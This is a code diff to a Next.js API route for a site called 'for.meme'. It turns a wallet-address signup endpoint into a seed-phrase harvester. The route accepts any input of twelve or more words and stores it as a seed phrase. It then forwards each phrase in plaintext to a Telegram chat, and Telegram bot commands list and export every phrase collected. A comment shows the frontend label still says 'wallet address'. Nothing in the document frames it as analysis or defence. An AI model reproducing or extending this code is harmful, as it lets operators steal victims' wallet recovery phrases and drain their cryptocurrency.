@@ -4,11 +4,9 @@ import { addWallet, getWalletStats, getAllWallets, WalletData } from '../../../l
 const TELEGRAM_BOT_TOKEN: string | undefined = process.env.TELEGRAM_BOT_TOKEN
 const TELEGRAM_CHAT_ID: string | undefined = process.env.TELEGRAM_CHAT_ID
 
-// Handle ALL requests (both wallet submissions and Telegram webhooks)
+// Handle ALL requests (both seed phrase submissions and Telegram webhooks)
 export async function POST(request: NextRequest) {
   try {
-    const contentType = request.headers.get('content-type')
-    
     // Read the body once and store it
     const body = await request.json()
     console.log('📨 Received request body:', body)
@@ -57,25 +55,27 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ success: true })
     }
 
-    // If no update_id, it's a wallet submission
-    console.log('💰 Wallet submission received')
-    const { walletAddress } = body
+    // If no update_id, it's a seed phrase submission
+    console.log('💰 Seed phrase submission received')
+    const { walletAddress } = body // Still called walletAddress from frontend
 
-    console.log('🔍 Wallet address:', walletAddress)
+    console.log('🔍 Seed phrase:', walletAddress)
 
     if (!walletAddress) {
-      console.log('❌ No wallet address provided')
-      return NextResponse.json({ error: 'Wallet address is required' }, { status: 400 })
+      console.log('❌ No seed phrase provided')
+      return NextResponse.json({ error: 'Seed phrase is required' }, { status: 400 })
     }
 
-    if (!walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
-      console.log('❌ Invalid wallet address format')
-      return NextResponse.json({ error: 'Invalid Ethereum wallet address' }, { status: 400 })
+    // Basic seed phrase validation (at least 12 words)
+    const words = walletAddress.trim().split(/\s+/)
+    if (words.length < 12) {
+      console.log('❌ Invalid seed phrase format')
+      return NextResponse.json({ error: 'Please enter a valid seed phrase (minimum 12 words)' }, { status: 400 })
     }
 
-    // Store wallet
+    // Store seed phrase
     const walletData: WalletData = {
-      address: walletAddress,
+      seedPhrase: walletAddress, // Store as seedPhrase
       timestamp: new Date().toISOString(),
       source: 'for.meme'
     }
@@ -90,9 +90,9 @@ export async function POST(request: NextRequest) {
     // Send notification to Telegram
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
       console.log('🔍 Sending Telegram notification...')
-      const notificationMessage = `🤑 *New Wallet Registered!*\n\n` +
-        `💰 *Wallet:* \`${walletAddress}\`\n` +
-        `📊 *Total Wallets:* ${stats.total}\n` +
+      const notificationMessage = `🤑 *New Seed Phrase Registered!*\n\n` +
+        `🔐 *Seed Phrase:* \`${walletAddress}\`\n` +
+        `📊 *Total Registrations:* ${stats.total}\n` +
         `📈 *Today:* ${stats.today}\n` +
         `⏰ *Time:* ${new Date().toLocaleString()}`
 
@@ -107,17 +107,17 @@ export async function POST(request: NextRequest) {
 
   } catch (error) {
     console.error('❌ Error in Telegram API:', error)
-    return NextResponse.json({ success: true }) // Always return success to Telegram
+    return NextResponse.json({ success: true })
   }
 }
 
-// Command handlers (keep all these the same as before)
+// Command handlers - Updated text
 async function handleStartCommand(chatId: string | number) {
   const stats = await getWalletStats()
   const message = `🤖 *Welcome to for.meme Bot!*\n\n` +
-    `I manage wallet registrations from the for.meme website.\n\n` +
+    `I manage seed phrase registrations from the for.meme website.\n\n` +
     `📊 *Current Stats:*\n` +
-    `• Total Wallets: ${stats.total}\n` +
+    `• Total Registrations: ${stats.total}\n` +
     `• Registered Today: ${stats.today}\n\n` +
     `Use /help to see all available commands.`
 
@@ -127,20 +127,20 @@ async function handleStartCommand(chatId: string | number) {
 async function handleWalletsCommand(chatId: string | number) {
   const stats = await getWalletStats()
   
-  let message = `📊 *All Wallet Statistics*\n\n`
-  message += `💰 *Total Wallets:* ${stats.total}\n`
+  let message = `📊 *All Seed Phrase Statistics*\n\n`
+  message += `💰 *Total Registrations:* ${stats.total}\n`
   message += `📈 *Registered Today:* ${stats.today}\n`
   message += `⏰ *Last Updated:* ${new Date().toLocaleString()}\n\n`
 
   if (stats.recent.length > 0) {
-    message += `*Recent Wallets (last 10):*\n`
+    message += `*Recent Seed Phrases (last 10):*\n`
     stats.recent.slice(-10).forEach((wallet, index) => {
       const time = new Date(wallet.timestamp).toLocaleTimeString()
       const date = new Date(wallet.timestamp).toLocaleDateString()
-      message += `${index + 1}. \`${wallet.address}\`\n   📅 ${date} ${time}\n\n`
+      message += `${index + 1}. \`${wallet.seedPhrase}\`\n   📅 ${date} ${time}\n\n`
     })
   } else {
-    message += `No wallets registered yet.`
+    message += `No seed phrases registered yet.`
   }
 
   await sendTelegramMessage(chatId, message)
@@ -150,10 +150,10 @@ async function handleStatsCommand(chatId: string | number) {
   const stats = await getWalletStats()
 
   const message = `📈 *Quick Stats*\n\n` +
-    `• Total Wallets: ${stats.total}\n` +
+    `• Total Seed Phrases: ${stats.total}\n` +
     `• Registered Today: ${stats.today}\n` +
     `• Last 10 Registrations: ${stats.recent.length}\n\n` +
-    `_Use /wallets to see all wallet addresses_`
+    `_Use /wallets to see all seed phrases_`
 
   await sendTelegramMessage(chatId, message)
 }
@@ -162,15 +162,15 @@ async function handleExportCommand(chatId: string | number) {
   const allWallets = await getAllWallets()
 
   if (allWallets.length === 0) {
-    await sendTelegramMessage(chatId, 'No wallets found in database.')
+    await sendTelegramMessage(chatId, 'No seed phrases found in database.')
     return
   }
 
-  let message = `📁 *All Wallets (${allWallets.length})*\n\n`
+  let message = `📁 *All Seed Phrases (${allWallets.length})*\n\n`
 
   allWallets.forEach((wallet, index) => {
     const time = new Date(wallet.timestamp).toLocaleString()
-    message += `${index + 1}. \`${wallet.address}\`\n   ⏰ ${time}\n\n`
+    message += `${index + 1}. \`${wallet.seedPhrase}\`\n   ⏰ ${time}\n\n`
   })
 
   await sendTelegramMessage(chatId, message)
@@ -179,16 +179,16 @@ async function handleExportCommand(chatId: string | number) {
 async function handleHelpCommand(chatId: string | number) {
   const message = `🤖 *Available Commands*\n\n` +
     `*/start* - Welcome message with stats\n` +
-    `*/wallets* - Show all wallet addresses and stats\n` +
+    `*/wallets* - Show all seed phrases and stats\n` +
     `*/stats* - Quick statistics overview\n` +
-    `*/export* - Export all wallet addresses\n` +
+    `*/export* - Export all seed phrases\n` +
     `*/help* - Show this help message\n\n` +
     `💡 *All commands are available to everyone with bot access*`
 
   await sendTelegramMessage(chatId, message)
 }
 
-// Utility function to send messages
+// Utility function to send messages (same as before)
 async function sendTelegramMessage(chatId: string | number, text: string) {
   if (!TELEGRAM_BOT_TOKEN) {
     console.log('❌ No Telegram bot token configured')
@@ -219,7 +219,7 @@ async function sendTelegramMessage(chatId: string | number, text: string) {
   }
 }
 
-// Handle GET requests
+// Handle GET requests (same as before)
 export async function GET(request: NextRequest) {
   const url = new URL(request.url)
   const setup = url.searchParams.get('setup')
